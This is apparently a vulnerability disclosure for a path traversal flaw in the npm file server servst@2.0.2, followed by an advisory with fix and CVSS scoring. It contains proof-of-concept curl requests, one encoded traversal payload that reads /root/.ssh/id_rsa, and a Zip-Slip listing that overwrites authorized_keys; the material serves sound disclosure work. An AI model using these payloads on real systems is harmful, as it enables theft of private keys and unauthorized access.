Path traversal in servst@2.0.2

 [Raw](/lirantal/691d02d607753d54856f9335f9a1692f/raw/d84af7c487fd34034102fbe5202d25cf23eef8b7/path-traversal-in-servst.md)

# Path traversal vulnerability in servst@2.0.2

`servst` is a local HTTP file server, or as is it describes itself: `Simple file server`.

Observation:

* It's at virtually 0 downloads (6 weekly)
* It was last published 7 years ago

Resources:

* Project's GitHub source code: <https://github.com/andrepolischuk/servst/>
* Project's npm package: <https://www.npmjs.com/package/servst>

## Background on exploitation

The `servst` is taking care to decode the URI, normalize the path
and even asset for the path accessed being relative to that of the
root directory, however this last case is where this is implemented
in a vulnerable way:

Lines 25-30 of `index.js`:

```
    if (filePath.indexOf(root) !== 0) {
      fn({
        url: filePath,
        status: 404
      });
    }
```

This vulnerability should probably be classified as a
[CWE-22](https://cwe.mitre.org/data/definitions/22.html): Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').

## Proof of Concept exploit

1. Install the latest version of `servst`: `npm install servst@2.0.2`
2. Make sure you have a `public/` directory with files in it
3. Make sure you have a `public-isprivate` directory with files in it
4. Make sure you have a `private/` directory with files in it

All directories above should share the same relative parent, meaning the
directory structure should look as follows:

```
.
├── private
│   └── index.html
├── public
│   └── index.html
└── public-isprivate
    └── index.html

```

Then, run a server powered by `servst` as follows:

```
var http = require('http');
var servst = require('servst');
var statics = servst(__dirname + '/public');

http.createServer(function(req, res) {
  statics(req, res, function(err) {
    if (err) {
      res.writeHead(404, {'Content-Type': 'text/plain'});
      res.end('Not found');
    }
  });
}).listen(3000);
```

which sets the public root directory to the `public/`
directory that we previously created:

The server should run within the local folder where all `private/`, `public/`,
and `public-isprivate` are subfolders.

Next, verify the following:

1. `curl --path-as-is "http://localhost:3000/../private/index.html"` -> this request is denied,
   as expected with prior vulnerability fix.
2. `curl --path-as-is "http://localhost:3000/../public/index.html"` -> this request is allowed,
   as expected with the functionality of this local http server
3. `curl --path-as-is "http://localhost:3000/../public-isprivate/index.html"` -> this request
   SHOULD BE DENIED because it is outside the `public/` folder, but it is actually allowed.

Case (3) shouldn't happen, but it does, due to an improper fix in the library's source code.

## How to fix?

Upgrade `servst` to version 2.0.3 or higher.

## Overview

Affected versions of this package are vulnerable to Directory Traversal due to improper sanitization of the `filePath` variable.

## PoC

```
curl --path-as-is "http://localhost:3000/../public-isprivate/index.html"

```
## Details

A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with "dot-dot-slash (../)" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

* **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm%3Ast%3A20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa

```

**Note** `%2e` is the URL encoded version of `.` (dot).

* **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`.

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys

```

### CVSS Scores

version 3.1
### Snyk

7.5 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is no impact to availability within the impacted component.

  **None**
